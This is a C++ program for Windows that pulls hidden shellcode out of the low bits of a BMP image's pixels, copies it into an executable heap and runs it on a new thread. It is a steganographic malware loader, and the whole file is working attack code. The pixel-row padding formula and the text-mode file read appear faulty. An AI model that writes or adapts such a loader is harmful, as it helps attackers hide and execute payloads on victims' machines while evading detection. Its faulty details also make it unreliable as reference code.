#define _CRT_SECURE_NO_WARNINGS
#include <fstream>
#include <Windows.h>


char get_lsb(char target, char source) {
    return (target << 1) | (source & 1);
}



const int shellcode_len = 1544;
char* payload_data = new char[shellcode_len / 8];


void read_image(std::string filename)
{
    char header[54];
    int height, width;

    std::ifstream file(filename);
  
    file.read(header, 54);


    /*
    * Get image width and height in pixels
    * 
    * Beware, some BMP images store negative values within the header fields.
    * This means that the coordinates of BMP image is flipped
    */

    width = abs(*(int *)(header + 18));
    height = abs(*(int *)(header + 22));


   /*
   * Get pixel row length in bytes
   * 
   * BMP requires padding to be a multiple of 4 bytes.
   * Colors themselves are stored as 3 bytes. 
   * We must round length to next nearest multiple of 4 
   * https://en.wikipedia.org/wiki/BMP_file_format#Pixel_storage
   */

    int row_length = 4 * ((width + 1) * 3 / 4);
    char* row_data = new char[row_length];
   

    int pos = 0;

    for (int i = 0; i < height; i++)
    {
        file.read(row_data, row_length);
        for (int j = 0; j < width * 3; j++, pos++)
        {
            payload_data[pos / 8] = get_lsb(payload_data[pos / 8], row_data[j]);
            if (pos >= shellcode_len) {
                file.close();
                return;
            }
        }
    }
   
}


int main() {
    read_image("helpme.bmp");
 
    LPVOID heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    LPVOID ptr = HeapAlloc(heap, 0, shellcode_len / 8);
    RtlMoveMemory(ptr, payload_data, shellcode_len / 8);


    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);

    
    getchar();
    return 0;
}